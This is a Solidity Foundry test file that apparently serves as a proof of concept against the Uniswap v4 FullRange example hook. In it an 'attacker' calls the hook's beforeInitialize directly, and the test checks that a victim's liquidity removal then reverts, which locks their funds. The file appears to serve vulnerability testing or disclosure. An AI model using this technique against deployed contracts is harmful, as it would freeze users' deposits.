// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {GasSnapshot} from "forge-gas-snapshot/GasSnapshot.sol";
import {Hooks} from "@uniswap/v4-core/contracts/libraries/Hooks.sol";
import {FullRange} from "@uniswap/v4-periphery/contracts/hooks/examples/FullRange.sol";
import {FullRangeImplementation} from "@uniswap/v4-periphery/test/shared/implementation/FullRangeImplementation.sol";
import {PoolManager} from "@uniswap/v4-core/contracts/PoolManager.sol";
import {IPoolManager} from "@uniswap/v4-core/contracts/interfaces/IPoolManager.sol";
import {Deployers} from "@uniswap/v4-core/test/foundry-tests/utils/Deployers.sol";
import {MockERC20} from "@uniswap/v4-core/test/foundry-tests/utils/MockERC20.sol";
import {Currency, CurrencyLibrary} from "@uniswap/v4-core/contracts/types/Currency.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/contracts/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/contracts/types/PoolKey.sol";
import {IHooks} from "@uniswap/v4-core/contracts/interfaces/IHooks.sol";
import {UniswapV4ERC20} from "@uniswap/v4-periphery/contracts/libraries/UniswapV4ERC20.sol";
import {SafeCast} from "@uniswap/v4-core/contracts/libraries/SafeCast.sol";

contract TestBadFullRange is Test, Deployers, GasSnapshot {
    using PoolIdLibrary for PoolKey;
    using SafeCast for uint256;
    using CurrencyLibrary for Currency;

    event Initialize(
        PoolId indexed poolId,
        Currency indexed currency0,
        Currency indexed currency1,
        uint24 fee,
        int24 tickSpacing,
        IHooks hooks
    );
    event ModifyPosition(
        PoolId indexed poolId, address indexed sender, int24 tickLower, int24 tickUpper, int256 liquidityDelta
    );
    event Swap(
        PoolId indexed id,
        address indexed sender,
        int128 amount0,
        int128 amount1,
        uint160 sqrtPriceX96,
        uint128 liquidity,
        int24 tick,
        uint24 fee
    );

    int24 constant TICK_SPACING = 60;
    uint16 constant LOCKED_LIQUIDITY = 1000;
    uint256 constant MAX_DEADLINE = 12329839823;

    MockERC20 token0;
    MockERC20 token1;

    PoolManager manager;
    FullRangeImplementation fullRange = FullRangeImplementation(
        address(uint160(Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_MODIFY_POSITION_FLAG | Hooks.BEFORE_SWAP_FLAG))
    );

    PoolKey key;
    PoolId id;
    
    address poolCreator;
    address victim;
    address attacker;


    function setUp() public {

        poolCreator = address(0x1);
        victim = address(0x2);
        attacker = address(0x3);

        manager = new PoolManager(500000);

        FullRangeImplementation impl = new FullRangeImplementation(manager, fullRange);
        vm.etch(address(fullRange), address(impl).code);

        token0 = new MockERC20("TestA", "A", 18, 2 ** 128);
        token1 = new MockERC20("TestB", "B", 18, 2 ** 128);

        key = createPoolKey(token0, token1);
        id = key.toId();
        
        token0.transfer(victim, 20 ether);
        token1.transfer(victim, 20 ether);
        
        vm.startPrank(victim);
        token0.approve(address(fullRange), type(uint256).max);
        token1.approve(address(fullRange), type(uint256).max);
    }

    function test_abuser_FullRange_removeLiquidityForOverridenPool() public {
        // Initialize pool 
        vm.startPrank(poolCreator);
        manager.initialize(key, SQRT_RATIO_1_1, ZERO_BYTES);

        // Adding liquidity by legitimate user
        vm.startPrank(victim);
        uint256 prevBalance0 = key.currency0.balanceOf(victim);
        uint256 prevBalance1 = key.currency1.balanceOf(victim);

        fullRange.addLiquidity(
            FullRange.AddLiquidityParams(
                key.currency0, key.currency1, 3000, 10 ether, 10 ether, 9 ether, 9 ether, victim, MAX_DEADLINE
            )
        );
        assertEq(key.currency0.balanceOf(victim), prevBalance0 - 10 ether);
        assertEq(key.currency1.balanceOf(victim), prevBalance1 - 10 ether);

        // Attack
        vm.startPrank(attacker);
        fullRange.beforeInitialize(address(uint160(0xdeadbeef)), key, 0, "");

        // Check if liquidity removal by the victim reverts
        vm.startPrank(victim);
        vm.expectRevert();
        fullRange.removeLiquidity(
            FullRange.RemoveLiquidityParams(key.currency0, key.currency1, 3000, 5 ether, MAX_DEADLINE)
        );
    }

    function createPoolKey(MockERC20 tokenA, MockERC20 tokenB) internal view returns (PoolKey memory) {
        if (address(tokenA) > address(tokenB)) (tokenA, tokenB) = (tokenB, tokenA);
        return PoolKey(Currency.wrap(address(tokenA)), Currency.wrap(address(tokenB)), 3000, TICK_SPACING, fullRange);
    }
}
